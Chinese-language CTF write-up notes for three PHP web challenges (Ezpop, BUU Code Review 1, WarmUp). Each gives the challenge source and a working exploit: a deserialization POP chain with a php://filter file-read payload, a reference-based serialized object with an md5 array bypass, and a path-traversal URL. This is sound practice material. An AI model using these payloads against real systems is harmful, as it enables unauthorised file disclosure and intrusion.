## [MRCTF2020]Ezpop

题目代码
```

Welcome to index.php
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
} 

```

poc

```

<?php
class Modifier {
    protected  $var='php://filter/read=convert.base64-encode/resource=flag.php' ;

}

class Show{
    public $source;
    public $str;
	public function __construct($file){
    $this->source = $file;
    }
    public function __toString(){
        return "karsa";
    }
}

class Test{
    public $p;
}

$a = new Show('aaa');
$a->str = new Test();
$a->str->p = new Modifier();
$b = new Show($a);
echo urlencode(serialize($b));
?>
```


## BUU CODE REVIEW 1
```

class BUU {
   public $correct = "";
   public $input = "";

   public function __destruct() {
       try {
           $this->correct = base64_encode(uniqid());
           if($this->correct === $this->input) {
               echo file_get_contents("/flag");
           }
       } catch (Exception $e) {
       }
   }
}

if($_GET['pleaseget'] === '1') {
    if($_POST['pleasepost'] === '2') {
        if(md5($_POST['md51']) == md5($_POST['md52']) && $_POST['md51'] != $_POST['md52']) {
            unserialize($_POST['obj']);
        }
    }
}
```

poc

```

<?php
class BUU {
   public $correct = "";
   public $input = "";

   
}

$a = new BUU();
$a->correct=&$a->input;
echo serialize($a);

#O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;}
get:?pleaseget=1

post:pleasepost=2&md51[]=1&md52[]=2&obj=O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;}
```
## [HCTF 2018]WarmUp
```

class emmm
    {
        public static function checkFile(&$page)

        {
            //白名单列表
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            //isset()判断变量是否声明is_string()判断变量是否是字符串 &&用了逻辑与两个值都为真才执行if里面的值
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it A";
                return false;
            }
            //检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真
            if (in_array($page, $whitelist)) {
                return true;
            }
            //过滤问号的函数(如果$page的值有？则从?之前提取字符串)
            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')//返回$page.?里卖弄?号出现的第一个位置
            );

             //第二次检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真
            if (in_array($_page, $whitelist)) {
                return true;
            }
            //url对$page解码
            $_page = urldecode($page);

            //第二次过滤问号的函数(如果$page的值有？则从?之前提取字符串)
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            //第三次检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }
    
```

```
index.php?file=hint.php?../../../../../ffffllllaaaagggg 
```

